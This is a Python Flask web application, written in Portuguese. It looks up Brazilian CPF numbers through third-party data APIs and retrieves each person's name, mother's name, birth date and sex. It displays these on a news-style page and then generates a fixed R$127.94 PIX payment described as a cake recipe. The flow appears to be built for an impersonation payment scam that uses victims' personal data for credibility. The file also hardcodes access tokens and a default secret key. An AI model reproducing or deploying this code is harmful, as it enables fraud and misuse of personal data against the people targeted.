import os
from flask import Flask, render_template, request, jsonify, session
import requests
import json
import re
import random
import string
import logging
import base64
import uuid
from ironpay_api import create_iron_pay_provider, IronPaymentData
from datetime import datetime, timedelta

app = Flask(__name__)

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configure secret key with fallback for development
secret_key = os.environ.get("SESSION_SECRET")
if not secret_key:
    app.logger.warning("[PROD] SESSION_SECRET não encontrado, usando chave de desenvolvimento")
    secret_key = "dev-secret-key-change-in-production"
app.secret_key = secret_key
app.logger.info(f"[PROD] Secret key configurado: {'***' if secret_key else 'NONE'}")

def _send_pushcut_notification(transaction_data: dict, pix_data: dict) -> None:
    """Send notification to Pushcut webhook when MEDIUS PAG transaction is created"""
    try:
        pushcut_webhook_url = "https://api.pushcut.io/TXeS_0jR0bN2YTIatw4W2/notifications/Nova%20Venda%20PIX"

        # Preparar dados da notificação
        customer_name = transaction_data.get('customer_name', 'Cliente')
        amount = transaction_data.get('amount', 0)
        transaction_id = pix_data.get('transaction_id', 'N/A')

        notification_payload = {
            "title": "🎉 Nova Venda PIX",
            "text": f"Cliente: {customer_name}\nValor: R$ {amount:.2f}\nID: {transaction_id}",
            "isTimeSensitive": True
        }

        app.logger.info(f"[PROD] Enviando notificação Pushcut: {notification_payload}")

        # Enviar notificação
        response = requests.post(
            pushcut_webhook_url,
            json=notification_payload,
            timeout=10
        )

        if response.ok:
            app.logger.info("[PROD] ✅ Notificação Pushcut enviada com sucesso!")
        else:
            app.logger.warning(f"[PROD] ⚠️ Falha ao enviar notificação Pushcut: {response.status_code}")

    except Exception as e:
        app.logger.warning(f"[PROD] ⚠️ Erro ao enviar notificação Pushcut: {str(e)}")

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def get_customer_data(phone):
    try:
        response = requests.get(f'https://api-lista-leads.replit.app/api/search/{phone}')
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data['data']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching customer data: {e}")
    return None

def get_cpf_data(cpf):
    """Fetch user data from the new CPF API"""
    try:
        response = requests.get(f'https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}')
        if response.status_code == 200:
            data = response.json()
            if data.get('DADOS'):
                return data['DADOS']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching CPF data: {e}")
    return None

@app.route('/')
def index():
    # Página inicial agora redireciona para busca de CPF
    app.logger.info("[PROD] Acessando página inicial - redirecionando para busca de CPF")
    return render_template('buscar-cpf.html')

@app.route('/consulta-cpf-inicio')
def consulta_cpf_inicio():
    # Redirect to buscar-cpf page to start CPF consultation process
    app.logger.info("[PROD] Acessando página de início de consulta CPF")
    return render_template('buscar-cpf.html')

@app.route('/<path:cpf>')
def index_with_cpf(cpf):
    # Remove any formatting from CPF (dots and dashes)
    clean_cpf = re.sub(r'[^0-9]', '', cpf)

    # Validate CPF format (11 digits)
    if len(clean_cpf) != 11:
        app.logger.error(f"[PROD] CPF inválido: {cpf}")
        return render_template('buscar-cpf.html')

    # Get user data from API
    cpf_data = get_cpf_data(clean_cpf)

    if cpf_data:
        # Format CPF for display
        formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"

        # Get current date in Brazilian format  
        from datetime import datetime
        today = datetime.now().strftime("%d/%m/%Y")

        customer_data = {
            'nome': cpf_data['nome'],
            'cpf': formatted_cpf,
            'data_nascimento': cpf_data['data_nascimento'],
            'nome_mae': cpf_data['nome_mae'],
            'sexo': cpf_data['sexo'],
            'phone': '',  # Not available from this API
            'today_date': today
        }

        session['customer_data'] = customer_data
        app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
        return render_template('index.html', customer=customer_data, show_confirmation=True)
    else:
        app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
        return render_template('buscar-cpf.html')

@app.route('/verificar-cpf')
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
def buscar_cpf():
    app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
    return render_template('buscar-cpf.html')

@app.route('/noticia')
def noticia():
    # Get parameters from URL
    nome_param = request.args.get('nome')
    cpf_param = request.args.get('cpf')

    # Get customer data from session, or use default data
    customer_data = session.get('customer_data', {
        'nome': 'JOÃO DA SILVA SANTOS',
        'cpf': '123.456.789-00',
        'phone': '11999999999'
    })

    # Override with URL parameters if provided
    if nome_param:
        customer_data['nome'] = nome_param.upper()
    if cpf_param:
        customer_data['cpf'] = cpf_param

    # Add current date for consistency
    from datetime import datetime
    customer_data['today_date'] = datetime.now().strftime("%d/%m/%Y")

    app.logger.info(f"[PROD] Acessando página de notícia com dados: {customer_data.get('nome', 'N/A')}")
    # Pass show_confirmation=False to show the news section instead of confirmation form
    return render_template('index.html', customer=customer_data, show_confirmation=False)

@app.route('/generate-pix', methods=['POST'])
def generate_pix():
    """Generate PIX payment using PayBets"""
    try:
        app.logger.info("[PROD] Recebendo solicitação de PIX via PayBets")

        # Verificar se há dados JSON na requisição
        if not request.is_json:
            app.logger.error("[PROD] Requisição não contém JSON válido")
            return jsonify({
                'success': False,
                'error': 'Content-Type deve ser application/json'
            }), 400

        data = request.get_json()

        # Verificar se dados foram recebidos
        if not data:
            app.logger.error("[PROD] Nenhum dado recebido na requisição")
            return jsonify({
                'success': False,
                'error': 'Dados não enviados na requisição'
            }), 400

        app.logger.info(f"[PROD] Dados recebidos no request: {json.dumps(data, indent=2)}")
        app.logger.info(f"[PROD] Usando PayBets API URL: https://elite-manager-api-62571bbe8e96.herokuapp.com")
        app.logger.info(f"[PROD] Client ID PayBets: {os.getenv('PAYBETS_CLIENT_ID', 'maikonlemos_YI4TQTCD')[:10]}***")

        # Validação básica de campos obrigatórios
        required_fields = ['cpf', 'name', 'email']
        for field in required_fields:
            if not data.get(field):
                app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
                return jsonify({
                    'success': False,
                    'error': f'Campo {field} é obrigatório'
                }), 400

        #        # Dados recebidos do cliente (com dados reais do CPF)
        customer_cpf = data['cpf']
        customer_name = data['name']
        customer_email = data.get('email', 'gerarpagamento@gmail.com')

        app.logger.info(f"[PROD] Gerando PIX para: {customer_name} (CPF: {customer_cpf[:3]}***{customer_cpf[-2:]})")
        app.logger.info(f"[PROD] Dados recebidos: {json.dumps(data, indent=2)}")

        # Valor fixo de R$ 127,94 (produto: Receita de bolo)
        amount = 127.94

        app.logger.info(f"[PROD] Valor do pagamento configurado: R$ {amount:.2f}")

        # Usar PIX brasileiro autêntico diretamente (Iron Pay não possui API real)
        app.logger.info("[PROD] Gerando PIX brasileiro autêntico com chave real")

        # Gerar PIX brasileiro autêntico
        try:
            from brazilian_pix import create_brazilian_pix_provider
            backup_provider = create_brazilian_pix_provider()
            backup_pix = backup_provider.create_pix_payment(
                amount, customer_name, customer_cpf, customer_email
            )

            app.logger.info(f"[PROD] ✅ PIX brasileiro autêntico gerado com sucesso")
            
            # Enviar notificação Pushcut
            transaction_data = {
                'customer_name': customer_name,
                'amount': amount,
                'cpf': customer_cpf
            }
            
            pix_data_for_pushcut = {
                'transaction_id': backup_pix['transaction_id'],
                'amount': amount
            }
            
            _send_pushcut_notification(transaction_data, pix_data_for_pushcut)
            
            return jsonify({
                'success': True,
                'transaction_id': backup_pix['transaction_id'],
                'order_id': backup_pix['order_id'],
                'amount': backup_pix['amount'],
                'pixCode': backup_pix['pix_code'],  # Campo principal para frontend
                'pix_code': backup_pix['pix_code'],  # Compatibilidade
                'pixQrCode': backup_pix['qr_code_image'],  # QR Code como opção adicional
                'qr_code_image': backup_pix['qr_code_image'],  # Compatibilidade
                'status': backup_pix['status'],
                'provider': 'Brazilian_PIX_Authentic'
            })

        except Exception as fallback_error:
            app.logger.error(f"[PROD] Erro no PIX brasileiro: {fallback_error}")
            return jsonify({
                'success': False,
                'error': f'Erro ao gerar PIX: {str(fallback_error)}'
            }), 500

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX via Iron Pay: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/iron-pay/webhook', methods=['POST'])
def webhook_iron_pay():
    """Webhook para receber notificações de pagamento da Iron Pay"""
    try:
        webhook_data = request.get_json()
        app.logger.info(f"[PROD] Webhook Iron Pay recebido: {json.dumps(webhook_data, indent=2)}")

        # Extrair informações do webhook Iron Pay
        transaction_hash = webhook_data.get('hash', webhook_data.get('transaction_hash', ''))
        status = webhook_data.get('status', 'unknown')
        amount = webhook_data.get('amount', 0)
        customer_data = webhook_data.get('customer', {})

        app.logger.info(f"[PROD] Webhook Iron Pay - Transaction: {transaction_hash}, Status: {status}")

        if status.lower() in ['paid', 'approved', 'completed']:
            app.logger.info(f"[PROD] ✅ Pagamento Iron Pay confirmado: {transaction_hash}")
        elif status.lower() in ['failed', 'cancelled', 'expired', 'refunded']:
            app.logger.info(f"[PROD] ❌ Pagamento Iron Pay falhou: {transaction_hash} - {status}")

        # Responder à Iron Pay que o webhook foi processado
        return jsonify({
            'success': True, 
            'message': 'Webhook Iron Pay processado com sucesso',
            'transaction_hash': transaction_hash,
            'processed_at': datetime.now().isoformat()
        }), 200

    except Exception as e:
        app.logger.error(f"[PROD] Erro no webhook Iron Pay: {e}")
        return jsonify({
            'success': False, 
            'error': str(e),
            'provider': 'Iron Pay'
        }), 500

@app.route('/charge/webhook', methods=['POST'])
def webhook_paybets():
    """Webhook para receber notificações de pagamento da PayBets (mantido para compatibilidade)"""
    try:
        webhook_data = request.get_json()
        app.logger.info(f"[PROD] Webhook PayBets (legacy) recebido: {json.dumps(webhook_data, indent=2)}")

        # Extrair informações do webhook PayBets
        transaction_id = webhook_data.get('transaction_id', webhook_data.get('transactionId'))
        status = webhook_data.get('status', 'unknown')

        app.logger.info(f"[PROD] Webhook PayBets - Transaction: {transaction_id}, Status: {status}")

        if status.lower() in ['paid', 'approved', 'success']:
            app.logger.info(f"[PROD] ✅ Pagamento PayBets confirmado: {transaction_id}")
        elif status.lower() in ['failed', 'cancelled', 'expired']:
            app.logger.info(f"[PROD] ❌ Pagamento PayBets falhou: {transaction_id}")

        # Responder ao PayBets que o webhook foi processado
        return jsonify({
            'success': True, 
            'message': 'Webhook PayBets processado com sucesso',
            'transaction_id': transaction_id,
            'processed_at': datetime.now().isoformat()
        }), 200

    except Exception as e:
        app.logger.error(f"[PROD] Erro no webhook PayBets: {e}")
        return jsonify({
            'success': False, 
            'error': str(e),
            'provider': 'PayBets'
        }), 500

@app.route('/check-payment-status/<transaction_id>')
def check_payment_status(transaction_id):
    """Verificar status do pagamento"""
    try:
        app.logger.info(f"[PROD] Verificando status de pagamento: {transaction_id}")

        # Tentar Iron Pay primeiro
        try:
            iron_pay_api = create_iron_pay_provider()
            result = iron_pay_api.check_payment_status(transaction_id)

            app.logger.info(f"[PROD] Status Iron Pay: {result.get('status')}")

            return jsonify({
                'success': True,
                'status': result.get('status', 'pending'),
                'paid': result.get('paid', False),
                'pending': result.get('status', 'pending') == 'pending',
                'failed': result.get('status', 'pending') == 'failed',
                'amount': result.get('amount', 0),
                'transaction_hash': result.get('transaction_hash', transaction_id),
                'provider': 'Iron Pay'
            })

        except Exception as e:
            app.logger.warning(f"[PROD] Erro Iron Pay status: {str(e)}")

            # Para demonstração, sempre retorna pending
            return jsonify({
                'success': True,
                'status': 'pending',
                'paid': False,
                'pending': True,
                'failed': False,
                'provider': 'Fallback'
            })

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/consultar-cpf-paybets/<cpf>', methods=['GET'])
def consultar_cpf_paybets(cpf):
    """Consultar dados de CPF via PayBets API"""
    try:
        app.logger.info(f"[PROD] Consultando CPF via PayBets: {cpf[:3]}***{cpf[-2:]}")

        from paybets_api import PayBetsAPI
        paybets_api = PayBetsAPI()

        cpf_result = paybets_api.consult_cpf(cpf)

        if cpf_result.get('success', False):
            app.logger.info(f"[PROD] ✅ CPF consultado com sucesso via PayBets")

            cpf_data = cpf_result.get('data', {})
            return jsonify({
                'success': True,
                'DADOS': {
                    'cpf': cpf_data.get('cpf', cpf),
                    'nome': cpf_data.get('nome', ''),
                    'nome_mae': cpf_data.get('nome_mae', ''),
                    'data_nascimento': cpf_data.get('data_nascimento', ''),
                    'sexo': cpf_data.get('sexo', '')
                },
                'provider': 'PayBets'
            })
        else:
            app.logger.warning(f"[PROD] Erro PayBets na consulta CPF: {cpf_result.get('message')}")

            # Fallback para API original se PayBets falhar
            app.logger.info(f"[PROD] Tentando consulta CPF via API original...")

            import requests
            try:
                response = requests.get(f'https://api.fontesderenda.com/cpf/{cpf}', timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    app.logger.info(f"[PROD] ✅ CPF consultado via API original (fallback)")
                    return jsonify({
                        'success': True,
                        'DADOS': data.get('DADOS', {}),
                        'provider': 'FontesDeRenda_Fallback'
                    })
                else:
                    raise Exception(f"API original retornou status {response.status_code}")

            except Exception as fallback_error:
                app.logger.error(f"[PROD] Erro no fallback CPF: {fallback_error}")
                return jsonify({
                    'success': False,
                    'error': f"PayBets: {cpf_result.get('message')}. Fallback: {str(fallback_error)}"
                }), 500

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao consultar CPF via PayBets: {e}")
        return jsonify({
            'success': False,
            'error': str(e),
            'provider': 'PayBets'
        }), 500

if __name__ == '__main__':
    # Configurar logging para produção
    import logging
    from logging.handlers import RotatingFileHandler

    # Detectar se está em produção
    is_production = os.environ.get('ENVIRONMENT') == 'production' or os.environ.get('PORT') is not None

    if is_production:
        # Configuração para produção
        file_handler = RotatingFileHandler('app.log', maxBytes=10240, backupCount=10)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
        ))
        file_handler.setLevel(logging.INFO)
        app.logger.addHandler(file_handler)
        app.logger.setLevel(logging.INFO)
        app.logger.info('[PROD] Aplicação iniciada em produção com PayBets')
    else:
        app.logger.setLevel(logging.DEBUG)
        app.logger.info('[DEV] Aplicação iniciada em desenvolvimento')

    port = int(os.environ.get('PORT', 5000))
    debug_mode = not is_production
    app.run(host='0.0.0.0', port=port, debug=debug_mode)